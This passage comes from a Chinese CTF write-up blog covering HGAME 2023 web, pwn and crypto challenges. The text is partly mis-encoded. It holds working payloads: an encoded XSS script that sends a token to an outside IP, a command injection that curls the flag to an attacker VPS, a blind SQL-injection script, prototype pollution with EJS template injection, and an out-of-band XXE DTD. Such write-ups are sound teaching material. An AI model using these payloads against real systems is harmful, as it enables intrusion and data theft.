mp;#x65;&amp;#x28;&amp;#x74;&amp;#x68;&amp;#x69;&amp;#x73;&amp;#x2e;&amp;#x72;&amp;#x65;&amp;#x73;&amp;#x70;&amp;#x6f;&amp;#x6e;&amp;#x73;&amp;#x65;&amp;#x54;&amp;#x65;&amp;#x78;&amp;#x74;&amp;#x29;&amp;#x3b;&amp;#x78;&amp;#x68;&amp;#x72;&amp;#x2e;&amp;#x6f;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x28;&amp;#x22;&amp;#x47;&amp;#x45;&amp;#x54;&amp;#x22;&amp;#x2c;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#x34;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x39;&amp;#x33;&amp;#x2e;&amp;#x32;&amp;#x30;&amp;#x32;&amp;#x3a;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x2f;&amp;#x22;&amp;#x2b;&amp;#x61;&amp;#x2e;&amp;#x74;&amp;#x6f;&amp;#x6b;&amp;#x65;&amp;#x6e;&amp;#x29;&amp;#x3b;&amp;#x78;&amp;#x68;&amp;#x72;&amp;#x2e;&amp;#x73;&amp;#x65;&amp;#x6e;&amp;#x64;&amp;#x28;&amp;#x29;&amp;#x3b;&amp;#x7d;&amp;#x3b;&amp;#x78;&amp;#x68;&amp;#x72;&amp;#x2e;&amp;#x73;&amp;#x65;&amp;#x6e;&amp;#x64;&amp;#x28;&amp;#x64;&amp;#x61;&amp;#x74;&amp;#x61;&amp;#x29;&amp;#x3b;&lt;/script&gt;&quot;&#125;
</code></pre>
<p>ä¹‹åå°±å¯ä»¥åœ¨vpsä¸Šå‘ç°ä¼ æ¥çš„tokenï¼Œç›´æ¥åœ¨<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a>è¿™ä¸Šé¢è¿›è¡Œè§£ç ,å°±å¯ä»¥è·å¾—flag</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301192324392.png" alt="image-20230119232449282"></p>
<h2 id="Week3-Ping-To-The-Host"><a href="#Week3-Ping-To-The-Host" class="headerlink" title="Week3-Ping To The Host"></a>Week3-Ping To The Host</h2><p>ä¸€ä¸ªå‘½ä»¤æ³¨å…¥ï¼Œå¾ˆç®€å•</p>
<p>ä½¿ç”¨vpsæ¥å—flag</p>
<p>payload:</p>
<pre><code class="bash">ip=127.0.0.1%26%26a=cu%26%26b=rl%26%26$a$b$&#123;IFS&#125;&#39;vpsip:vpsport/&#39;`c=ca%26%26d=t%26%26$c$d$&#123;IFS&#125;/f*`
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301251755727.png" alt="image-20230125175455632"></p>
<p>ç„¶åè‡ªå·±åŠ <code>&#123;</code>å’Œ<code>&#125;</code></p>
<h2 id="Week3-Login-To-Get-My-Gift"><a href="#Week3-Login-To-Get-My-Gift" class="headerlink" title="Week3-Login To Get My Gift"></a>Week3-Login To Get My Gift</h2><p>ç›²æ³¨</p>
<p>ç»è¿‡ç®€å•çš„fuzzï¼Œé¢˜ç›®è¿‡æ»¤äº†ä»¥ä¸‹å…³é”®å­—</p>
<pre><code>  AND  LIKE  MIDDLEINT  RLIKE  UNION  UPDATE  handler  like  handler  -- -  !  =  AND  &#39;1&#39;=&#39;1  union  
</code></pre>
<p>æ²¡æœ‰è¿‡æ»¤<code>regexp</code>å’Œè½¬ä¹‰ç¬¦åˆ<code>\</code>ï¼Œä¸”ç»è¿‡æµ‹è¯•ï¼Œé¢˜ç›®æ˜¯ç”¨<code>&#39;</code>æ¥åŒ…è£¹æ•°æ®</p>
<p>åˆ©ç”¨è½¬ä¹‰ç¬¦åˆ<code>\</code>å°†usernameçš„ç¬¬äºŒä¸ª<code>&#39;</code>è½¬ä¹‰ï¼Œç„¶åä½¿passwordåé¢çš„ç¬¬ä¸€ä¸ª<code>&#39;</code>ä¸usernameçš„ç¬¬ä¸€ä¸ª<code>&#39;</code>è¿›è¡Œé—­åˆ</p>
<p>å†åé¢åˆ©ç”¨regexpè¿›è¡Œç›²æ³¨</p>
<p>egï¼š</p>
<pre><code class="sql">select * from users where username=&#39;\&#39; and password=&#39;|| (select group_concat(table_name) from information_schema.tables where database() regexp database()) regexp &#39;^xxx&#39;
</code></pre>
<p>ç©ºæ ¼ä½¿ç”¨<code>/**/</code>æ›¿ä»£</p>
<p>è¦ä½¿ç”¨binaryæ¥åŒ¹é…å¤§å°å†™</p>
<p>exp:</p>
<pre><code class="python">import requests
import string
url=&quot;http://week-3.hgame.lwsec.cn:32312/login&quot;
str=string.ascii_letters+string.digits+&quot;&#123;&#125;,-_&quot;
# table_schema=&#39;information_schema,performance_schema,L0g1NMe&#39;
# table_name=&#39;User1nf0mAt1on,ADMINISTRABLE&#39;
# column_name=&#39;iD,uSerN4mE,pASsw0rD|uSer,host,grANTeE,grANTeE&#39;
# username=&#39;hgAmE2023HAppYnEwyEAr&#39;
# password=&#39;WeLc0meT0hgAmE2023hAPPySql&#39;
result=&#39;&#39;
for x in range(50):
    for i in str:
        tmp=result+i
        #get table_schema
        # data=&#123;&quot;username&quot;:&quot;\\&quot;,
        #       &quot;password&quot;:&quot;||/**/(select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/1)/**/REGEXP/**/&#39;^&#123;&#125;&quot;.format(tmp)
        #       &#125;

        # get table_name
        # data=&#123;&quot;username&quot;:&quot;\\&quot;,
        #       &quot;password&quot;:&quot;||/**/(select/**/group_concat(table_name)/**/from/**/information_schema.TABLES/**/limit/**/1)/**/REGEXP/**/&#39;^&#123;&#125;&quot;.format(tmp)
        #       &#125;
        # get column_name
        # data=&#123;&quot;username&quot;:&quot;\\&quot;,
        #       &quot;password&quot;:&quot;||/**/(select/**/group_concat(column_name)/**/from/**/information_schema.COLUMNS/**/where/**/table_name/**/REGEXP/**/\&quot;User1nf0mAt1on\&quot;/**/limit/**/1)/**/REGEXP/**/&#39;^&#123;&#125;&quot;.format(tmp)
        #       &#125;
        #get username
        # data=&#123;&quot;username&quot;:&quot;\\&quot;,
        #       &quot;password&quot;:&quot;||/**/(select/**/group_concat(pASsw0rD)/**/from/**/User1nf0mAt1on/**/limit/**/1)/**/REGEXP/**/binary/**/&#39;^&#123;&#125;&quot;.format(tmp)
        #       &#125;
        res = requests.post(url=url,data=data)
        # print(res.text)
        if &quot;Success!&quot; in res.text:
            # print(res.text)
            result+=i
            print(result)
print(&quot;finish=&gt;&quot;+result)
</code></pre>
<p>æœ€åå¾—åˆ°è´¦æˆ·å¯†ç <code>hgAmE2023HAppYnEwyEAr / WeLc0meT0hgAmE2023hAPPySql</code></p>
<h2 id="Week3-Gopher-Shop"><a href="#Week3-Gopher-Shop" class="headerlink" title="Week3-Gopher Shop"></a>Week3-Gopher Shop</h2><p>åˆ©ç”¨å¹¶å‘é€ æˆçš„æ— ç¬¦å·æ•´æ•°å‘ä¸‹æº¢å‡º</p>
<p>å…³é”®ä»£ç </p>
<p><code>utils.GetOrderSum</code></p>
<pre><code class="go">package utils
func GetOrderSum(username string) (map[string]uint, error) &#123;
    order, err := db.GetOrder(username)

    if err != nil &#123;
        return nil, err
    &#125;

    var sum = map[string]uint&#123;&#125;

    for _, i := range order &#123;
        //åˆ¤æ–­sumæ˜¯å¦å­˜åœ¨i.Productå±æ€§ï¼Œä¸å­˜åœ¨åˆ™æ·»åŠ æ­¤å±æ€§
        _, exist := sum[i.Product]
        if !exist &#123;
            sum[i.Product] = 0
        &#125;

        if !i.Status &#123;
            sum[i.Product] -= i.Number
        &#125; else &#123;
            sum[i.Product] += i.Number
        &#125;
    &#125;

    // åˆ é™¤sumä¸­valueä¸º0çš„å±æ€§
    for k, v := range sum &#123;
        if v == 0 &#123;
            delete(sum, k)
        &#125;
    &#125;

    return sum, nil
&#125;
</code></pre>
<p>è¿™é‡Œçš„orderæ˜¯è¿”å›çš„ä¸€ä¸ªOrderç»“æ„ä½“æ•°ç»„ï¼Œè€Œsumæ˜¯ä¸€ä¸ªé”®ä¸ºstringç±»å‹ï¼Œå€¼ä¸ºuint(æ— ç¬¦å·æ•´æ•°)ç±»å‹çš„å­—å…¸</p>
<pre><code class="go">if !i.Status &#123;
    sum[i.Product] -= i.Number
&#125; else &#123;
    sum[i.Product] += i.Number
&#125;
</code></pre>
<p>è¿™é‡Œæ˜¯åˆ¤æ–­orderæ•°ç»„é‡Œçš„ç»“æ„ä½“å…ƒç´ çš„Statusæˆå‘˜çš„å€¼ï¼Œå¦‚æœä¸ºfalseå°±å°†sumå­—å…¸é‡Œçš„é”®ä¸ºi.Productçš„å€¼å‡ä¸€ï¼Œå¦åˆ™åŠ ä¸€</p>
<p>è¿™é‡ŒStatusçš„å€¼åœ¨ä¹°ä¸œè¥¿å’Œå–ä¸œè¥¿åä¼šè¢«èµ‹å€¼</p>
<p>ä¹°ä¸œè¥¿å</p>
<pre><code class="go">err = db.AddOrder(username.(string), product, uint(number), true)
</code></pre>
<p>å–ä¸œè¥¿å</p>
<pre><code class="go">err = db.AddOrder(username.(string), product, uint(number), false)
</code></pre>
<p>æ‰€ä»¥å¦‚æœstatusä¸ºfasleçš„è¯ï¼Œsum[i.Product]çš„å€¼å°±ä¼šå‡ä¸€ï¼Œå¦‚æœæ­¤æ—¶sum[i.Product]çš„å€¼ä¸º0ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆæ— ç¬¦å·æ•´æ•°å‘ä¸‹æº¢å‡º</p>
<p>è¿™æ ·å°±èƒ½è®©æˆ‘ä»¬å·²ç»è´­ä¹°çš„ä¸œè¥¿æ•°é‡å¢åŠ </p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301311418413.png" alt="image-20230131141753319"></p>
<p>å› ä¸ºaddorderåœ¨åˆ¤æ–­æ˜¯å¦èƒ½ï¼ˆä¹°&#x2F;å–ï¼‰å‡ºä¹‹åæ‰æ‰§è¡Œçš„ï¼Œæ‰€ä»¥è¦å…ˆä¹°ä¸€ä¸ªè‹¹æœï¼Œç„¶åå†å¿«é€Ÿçš„å‘åŒ…ï¼Œè®©ä¸¤ä¸ªè¿›ç¨‹å‡ ä¹åŒæ—¶æ‰§è¡Œåˆ°addorder</p>
<p>è¿™æ ·åœ¨</p>
<pre><code class="go">order, err := db.GetOrder(username)
</code></pre>
<p>æ‰§è¡Œåå°±å¯ä»¥åœ¨ç»“æ„ä½“æ•°ç»„é‡Œå¾—åˆ°ä¸€ä¸ªstatusä¸ºtrueï¼Œä¸¤ä¸ªstatusä¸ºfalseçš„ç»“æ„ä½“ï¼Œå°±ä¼šå¯¼è‡´sum[i.Product]&#x3D;0+1-1-1ï¼Œå°±ä¼šæº¢å‡º</p>
<p>ä½¿ç”¨burpå‘åŒ…ï¼Œå¤šå‘å‡ æ¬¡ï¼ŒæˆåŠŸç‡å¤§ä¸€äº›</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301311432665.png" alt="image-20230131143239577"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301311432541.png" alt="image-20230131143251452"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301311433996.png" alt="image-20230131143308911"></p>
<p>ç„¶åå…¨å–äº†å°±èƒ½ä¹°Flagäº†</p>
<p><code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code></p>
<h2 id="Week4-Shared-Diary"><a href="#Week4-Shared-Diary" class="headerlink" title="Week4-Shared Diary"></a>Week4-Shared Diary</h2><p>nodejsåŸå‹é“¾æ±¡æŸ“</p>
<p>ç¦ç”¨äº†<code>__proto__</code>å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨<code>constructor.prototype</code>æ¥è¿›è¡Œæ±¡æŸ“</p>
<p>å› ä¸ºprototypeæ˜¯å‡½æ•°é‡Œé¢çš„å±æ€§ï¼Œè€Œconstructorå¯ä»¥åˆ›å»ºä¸€ä¸ªå…³äºæ­¤å¯¹è±¡çš„å‡½æ•°ï¼Œä»è€Œè¿›è¡Œæ±¡æŸ“</p>
<p>payload</p>
<pre><code class="json">&#123;&quot;username&quot;:&quot;w&quot;,
&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125;
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301312039066.png" alt="image-20230131203849947"></p>
<p>å¾—åˆ°sessionï¼Œå¤åˆ¶sessionåˆ°cookieï¼Œè¿›å…¥è·¯ç”±<code>/</code></p>
<p>åœ¨ejsæ–‡ä»¶é‡Œdirayå¯¹è±¡æ˜¯ç”¨<code>&lt;%- %&gt;</code>åŒ…è£¹çš„</p>
<pre><code class="ejs">&lt;h1&gt;&lt;%- diary %&gt;&lt;/h1&gt;
</code></pre>
<blockquote>
<p><strong>æ ‡ç­¾å«ä¹‰</strong></p>
<ul>
<li><code>&lt;%</code> â€˜è„šæœ¬â€™ æ ‡ç­¾ï¼Œç”¨äºæµç¨‹æ§åˆ¶ï¼Œæ— è¾“å‡ºã€‚</li>
<li><code>&lt;%_</code> åˆ é™¤å…¶å‰é¢çš„ç©ºæ ¼ç¬¦</li>
<li><code>&lt;%=</code> è¾“å‡ºæ•°æ®åˆ°æ¨¡æ¿ï¼ˆè¾“å‡ºæ˜¯è½¬ä¹‰ HTML æ ‡ç­¾ï¼‰</li>
<li><code>&lt;%-</code> è¾“å‡ºéè½¬ä¹‰çš„æ•°æ®åˆ°æ¨¡æ¿</li>
<li><code>&lt;%#</code> æ³¨é‡Šæ ‡ç­¾ï¼Œä¸æ‰§è¡Œã€ä¸è¾“å‡ºå†…å®¹</li>
<li><code>&lt;%%</code> è¾“å‡ºå­—ç¬¦ä¸² â€˜&lt;%â€™</li>
<li><code>%&gt;</code> ä¸€èˆ¬ç»“æŸæ ‡ç­¾</li>
<li><code>-%&gt;</code> åˆ é™¤ç´§éšå…¶åçš„æ¢è¡Œç¬¦</li>
<li><code>_%&gt;</code> å°†ç»“æŸæ ‡ç­¾åé¢çš„ç©ºæ ¼ç¬¦åˆ é™¤</li>
</ul>
</blockquote>
<p>æ‰€ä»¥è¿™é‡Œè¾“å‡ºçš„å†…å®¹ä¸ä¼šè¢«è½¬ä¹‰ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨æ ‡ç­¾<code>&lt;%= %&gt;</code>è¿›è¡Œæ¨¡æ¿æ³¨å…¥</p>
<p>payload</p>
<pre><code>POST: diary=&lt;%25= this.global.process.mainModule.require(&#39;fs&#39;).readFileSync(&#39;/flag&#39;)%25&gt;
</code></pre>
<p>å¾—åˆ°flag</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301312043452.png" alt="image-20230131204342354"></p>
<h2 id="Week4-Tell-Me"><a href="#Week4-Tell-Me" class="headerlink" title="Week4-Tell Me"></a>Week4-Tell Me</h2><p>ä¸€é“XXE</p>
<p>æŸ¥çœ‹æºç </p>
<pre><code class="php">&lt;?php 
    
libxml_disable_entity_loader(false);

if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)&#123;
    $xmldata = file_get_contents(&quot;php://input&quot;);
    if (isset($xmldata))&#123;
        $dom = new DOMDocument();
        try &#123;
            $dom-&gt;loadXML($xmldata, LIBXML_NOENT | LIBXML_DTDLOAD);
        &#125;catch(Exception $e)&#123;
            $result = &quot;loading xml data error&quot;;
            echo $result;
            return;
        &#125;
        $data = simplexml_import_dom($dom);

        if (!isset($data-&gt;name) || !isset($data-&gt;email) || !isset($data-&gt;content))&#123;
            $result = &quot;name,email,content cannot be empty&quot;;
            echo $result;
            return;
        &#125;

        if ($data-&gt;name &amp;&amp; $data-&gt;email &amp;&amp; $data-&gt;content)&#123;
            $result = &quot;Success! I will see it later&quot;;
            echo $result;
            return;
        &#125;else &#123;
            $result = &quot;Parse xml data error&quot;;
            echo $result;
            return;
        &#125;
    &#125;
&#125;else &#123;
    die(&quot;Request Method Not Allowed&quot;);
&#125;

?&gt;
</code></pre>
<p>å¾ˆæ˜æ˜¾çš„XXEï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥å¼•ç”¨å¤–éƒ¨å®ä½“æ³¨å…¥è¿›è¡Œoob</p>
<p>æ¶æ„dtdï¼Œæ”¾åœ¨vpsä¸Šï¼Œç„¶åç”¨pythonå¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p>
<pre><code class="xml">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://vpsip:port/?content=%file;&#39;&gt;&quot;&gt;%payload;%send;
</code></pre>
<p>payload:</p>
<p>nameã€emailå’Œcontenté‡Œé¢è¦æœ‰å€¼</p>
<p>ä½¿ç”¨burpæ”¾åœ¨bodyé‡Œå‘åŒ…</p>
<pre><code class="xml">&lt;!DOCTYPE xml[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;
&lt;!ENTITY % remote SYSTEM &quot;http://vpsip:port/1.dtd&quot;&gt;%remote;]&gt;
&lt;user&gt;&lt;name&gt;
%remote;
&lt;/name&gt;&lt;email&gt;asd&lt;/email&gt;&lt;content&gt;asd&lt;/content&gt;
&lt;/user&gt;
</code></pre>
<p>ç„¶åå‘åŒ…ï¼Œåœ¨vpsä¸Šå¼€å¯ç›‘å¬ï¼Œå°±èƒ½è·å¾—base64ç¼–ç åçš„flag</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302052155162.png" alt="image-20230205215507158"></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-test-nc"><a href="#Week1-test-nc" class="headerlink" title="Week1-test_nc"></a>Week1-test_nc</h2><p>ç›´æ¥ncè¿æ¥åï¼Œcat flag</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Week1-RSA"><a href="#Week1-RSA" class="headerlink" title="Week1-RSA"></a>Week1-RSA</h2><p>ç®€å•çš„rsa</p>
<p>æºç ï¼š</p>
<pre><code class="py">from Crypto.Util.number import *

flag = open(&#39;flag.txt&#39;, &#39;rb&#39;).read()

p = getPrime(512)
q = getPrime(512)
n=p*q
e = 65537
m = bytes_to_long(flag)
c = pow(m, e, n)
print(f&quot;c=&#123;c&#125;&quot;)
print(f&quot;n=&#123;n&#125;&quot;)

&quot;&quot;&quot;
c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582
n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789
&quot;&quot;&quot;
</code></pre>
<p>ç”¨è¿™ä¸ªåˆ†è§£å‡ºpå’Œq<a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a></p>
<p>exp:</p>
<pre><code class="py">import gmpy2
from Crypto.Util.number import *
e = 65537
n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789
c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582
p=11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813
q=12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
m = pow(c,d,n)
print(long_to_bytes(m))
# b&#39;hgame&#123;factordb.com_is_strong!&#125;&#39;
</code></pre>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-07-03</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/CTF/'>
                            CTF
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/WP/'>
                            WP
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>